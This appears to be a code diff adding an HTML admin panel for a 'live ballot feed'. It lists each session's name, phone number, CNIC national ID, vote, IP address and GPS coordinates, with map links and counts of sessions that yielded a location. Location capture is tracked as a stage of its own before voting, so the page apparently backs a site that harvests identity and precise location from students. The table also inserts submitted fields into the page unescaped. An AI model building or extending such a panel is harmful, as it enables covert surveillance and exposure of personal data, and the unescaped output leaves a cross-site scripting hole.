@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Vote Dashboard</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    font-family: ui-monospace, Consolas, monospace;
+    margin: 0; padding: 20px;
+    background: #07090d; color: #d9e3f2;
+    background-image:
+      linear-gradient(rgba(0,230,255,.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,230,255,.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+  }
+  h1 {
+    font-size: 22px; margin: 0 0 4px;
+    background: linear-gradient(90deg, #00e6ff, #ff2fb9);
+    -webkit-background-clip: text; background-clip: text;
+    color: transparent;
+    letter-spacing: 2px; text-transform: uppercase;
+  }
+  .sub { color: #7b8a9f; font-size: 12px; margin-bottom: 18px; letter-spacing: 1px; }
+
+  .stats {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    gap: 12px; margin-bottom: 20px;
+  }
+  .stat {
+    background: #0f1420; border: 1px solid #1f2a3d; border-radius: 10px;
+    padding: 14px 16px; border-left: 4px solid #00e6ff;
+  }
+  .stat.g { border-left-color: #22ff88; }
+  .stat.a { border-left-color: #ffd60a; }
+  .stat.m { border-left-color: #ff2fb9; }
+  .stat .label { color: #7b8a9f; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; }
+  .stat .value { font-size: 24px; font-weight: 700; margin-top: 4px; color: #00e6ff; }
+  .stat.g .value { color: #22ff88; }
+  .stat.a .value { color: #ffd60a; }
+  .stat.m .value { color: #ff2fb9; }
+
+  .toolbar { display: flex; gap: 10px; margin-bottom: 12px; flex-wrap: wrap; align-items: center; }
+  .btn {
+    background: transparent; color: #00e6ff; border: 1px solid #00e6ff;
+    padding: 8px 14px; border-radius: 6px; cursor: pointer;
+    font-family: inherit; font-size: 13px; letter-spacing: 1px;
+    transition: background .2s, color .2s;
+  }
+  .btn:hover { background: #00e6ff; color: #07090d; }
+  .btn.on { background: #22ff88; color: #07090d; border-color: #22ff88; }
+  input[type="text"] {
+    background: #0f1420; border: 1px solid #1f2a3d; color: #d9e3f2;
+    padding: 8px 12px; border-radius: 6px; font-family: inherit; font-size: 13px;
+    min-width: 220px;
+  }
+  input[type="text"]:focus { outline: none; border-color: #00e6ff; }
+  .chip {
+    padding: 6px 12px; border-radius: 999px; font-size: 11px;
+    background: #0f1420; color: #7b8a9f; cursor: pointer;
+    border: 1px solid #1f2a3d; letter-spacing: 1px;
+  }
+  .chip.active { background: #00e6ff; color: #07090d; border-color: #00e6ff; }
+
+  .tally {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 12px; margin-bottom: 20px;
+  }
+  .tally-item {
+    background: #0f1420; border: 1px solid #1f2a3d; border-radius: 10px; padding: 14px;
+  }
+  .tally-item .name { color: #00e6ff; font-size: 13px; font-weight: 700; margin-bottom: 6px; }
+  .tally-item .votes { color: #22ff88; font-size: 22px; font-weight: 700; }
+  .tally-item .bar {
+    height: 4px; background: #1f2a3d; border-radius: 2px; margin-top: 8px; overflow: hidden;
+  }
+  .tally-item .bar > div {
+    height: 100%; background: linear-gradient(90deg, #00e6ff, #ff2fb9);
+  }
+
+  table {
+    width: 100%; border-collapse: collapse; font-size: 12px;
+    background: #0f1420; border-radius: 8px; overflow: hidden;
+  }
+  th, td {
+    padding: 8px 10px; text-align: left;
+    border-bottom: 1px solid #1f2a3d; vertical-align: top; word-break: break-all;
+  }
+  th {
+    background: #131a29; font-weight: 600; color: #7b8a9f;
+    font-size: 11px; letter-spacing: 1px; text-transform: uppercase;
+  }
+  tr:hover td { background: #131a29; }
+  .mono { font-family: ui-monospace, monospace; font-size: 11px; }
+  .empty { text-align: center; padding: 30px; color: #7b8a9f; }
+  .muted { color: #7b8a9f; }
+  .pill { padding: 2px 8px; border-radius: 999px; font-size: 10px; font-weight: 700; letter-spacing: 1px; }
+  .pill.voted   { background: #14351f; color: #22ff88; }
+  .pill.pending { background: #3a2a0a; color: #ffd60a; }
+  .pill.noloc   { background: #3a0f15; color: #ff4757; }
+  a { color: #00e6ff; }
+</style>
+</head>
+<body>
+
+<h1>● Vote Dashboard</h1>
+<div class="sub">studentDB.location · live ballot feed</div>
+
+<div class="stats">
+  <div class="stat"><div class="label">Sessions</div><div class="value" id="sTotal">—</div></div>
+  <div class="stat g"><div class="label">With Location</div><div class="value" id="sLoc">—</div></div>
+  <div class="stat m"><div class="label">Votes Submitted</div><div class="value" id="sVotes">—</div></div>
+  <div class="stat a"><div class="label">Pending Ballots</div><div class="value" id="sPending">—</div></div>
+</div>
+
+<div class="tally" id="tally"></div>
+
+<div class="toolbar">
+  <button class="btn" onclick="loadAll()">Refresh</button>
+  <button class="btn" id="autoBtn" onclick="toggleAuto()">Auto: OFF</button>
+  <span class="chip active" data-filter="all" onclick="setFilter('all')">All</span>
+  <span class="chip" data-filter="voted" onclick="setFilter('voted')">Voted</span>
+  <span class="chip" data-filter="pending" onclick="setFilter('pending')">Pending</span>
+  <input type="text" id="search" placeholder="Search name / phone / IP…" oninput="renderTable()" />
+  <span class="muted" id="count"></span>
+</div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Time</th>
+      <th>Status</th>
+      <th>Name</th>
+      <th>Phone</th>
+      <th>CNIC</th>
+      <th>Vote</th>
+      <th>IP</th>
+      <th>Lat</th>
+      <th>Lng</th>
+      <th>Maps</th>
+    </tr>
+  </thead>
+  <tbody id="tbody">
+    <tr><td colspan="10" class="empty">Loading…</td></tr>
+  </tbody>
+</table>
+
+<script>
+const API = "";
+let allRecords = [];
+let autoTimer = null;
+let filter = "all";
+
+function setFilter(f) {
+  filter = f;
+  document.querySelectorAll(".chip").forEach(el => el.classList.toggle("active", el.dataset.filter === f));
+  renderTable();
+}
+
+async function loadAll() {
+  try {
+    const [recsRes, statsRes] = await Promise.all([
+      fetch(API + "/api/records?limit=500"),
+      fetch(API + "/api/stats"),
+    ]);
+    allRecords = await recsRes.json();
+    const stats = await statsRes.json();
+
+    document.getElementById("sTotal").textContent   = stats.total_records ?? 0;
+    document.getElementById("sLoc").textContent     = stats.records_with_location ?? 0;
+    document.getElementById("sVotes").textContent   = stats.votes_submitted ?? 0;
+    document.getElementById("sPending").textContent = (stats.total_records ?? 0) - (stats.votes_submitted ?? 0);
+
+    const maxVotes = Math.max(1, ...(stats.tally || []).map(t => t.votes));
+    document.getElementById("tally").innerHTML = (stats.tally || []).length
+      ? stats.tally.map(t => `
+          <div class="tally-item">
+            <div class="name">${t.candidate}</div>
+            <div class="votes">${t.votes} vote${t.votes === 1 ? "" : "s"}</div>
+            <div class="bar"><div style="width:${(t.votes / maxVotes * 100).toFixed(1)}%"></div></div>
+          </div>`).join("")
+      : `<div class="empty" style="grid-column:1/-1">No votes yet</div>`;
+
+    renderTable();
+  } catch (e) {
+    document.getElementById("tbody").innerHTML =
+      `<tr><td colspan="10" class="empty">Failed: ${e.message}</td></tr>`;
+  }
+}
+
+function renderTable() {
+  const q = (document.getElementById("search").value || "").toLowerCase().trim();
+  let rows = allRecords.filter(r => {
+    const voted = !!r.vote_submitted_at;
+    if (filter === "voted" && !voted) return false;
+    if (filter === "pending" && voted) return false;
+    if (!q) return true;
+    return (
+      (r.name || "").toLowerCase().includes(q) ||
+      (r.phone || "").toLowerCase().includes(q) ||
+      (r.ip || "").toLowerCase().includes(q) ||
+      (r.candidate_name || "").toLowerCase().includes(q)
+    );
+  });
+
+  document.getElementById("count").textContent = `${rows.length} record(s)`;
+
+  const tbody = document.getElementById("tbody");
+  if (!rows.length) {
+    tbody.innerHTML = `<tr><td colspan="10" class="empty">No matching records</td></tr>`;
+    return;
+  }
+
+  tbody.innerHTML = rows.map(r => {
+    const hasLoc = r.latitude != null && r.longitude != null;
+    const voted = !!r.vote_submitted_at;
+    let pill;
+    if (voted)       pill = `<span class="pill voted">VOTED</span>`;
+    else if (hasLoc) pill = `<span class="pill pending">PENDING</span>`;
+    else             pill = `<span class="pill noloc">NO LOC</span>`;
+
+    const maps = hasLoc
+      ? `<a target="_blank" rel="noopener" href="https://www.google.com/maps?q=${r.latitude},${r.longitude}">Open</a>`
+      : `<span class="muted">—</span>`;
+
+    return `<tr>
+      <td class="mono">${r.server_received_at ? new Date(r.server_received_at).toLocaleString() : "—"}</td>
+      <td>${pill}</td>
+      <td>${r.name || "—"}</td>
+      <td class="mono">${r.phone || "—"}</td>
+      <td class="mono">${r.cnic || "—"}</td>
+      <td>${r.candidate_name || "—"}</td>
+      <td class="mono">${r.ip || "—"}</td>
+      <td class="mono">${r.latitude ?? "—"}</td>
+      <td class="mono">${r.longitude ?? "—"}</td>
+      <td>${maps}</td>
+    </tr>`;
+  }).join("");
+}
+
+function toggleAuto() {
+  const btn = document.getElementById("autoBtn");
+  if (autoTimer) {
+    clearInterval(autoTimer); autoTimer = null;
+    btn.textContent = "Auto: OFF"; btn.classList.remove("on");
+  } else {
+    autoTimer = setInterval(loadAll, 5000);
+    btn.textContent = "Auto: ON"; btn.classList.add("on");
+  }
+}
+
+loadAll();
+</script>
+
+</body>
+</html>
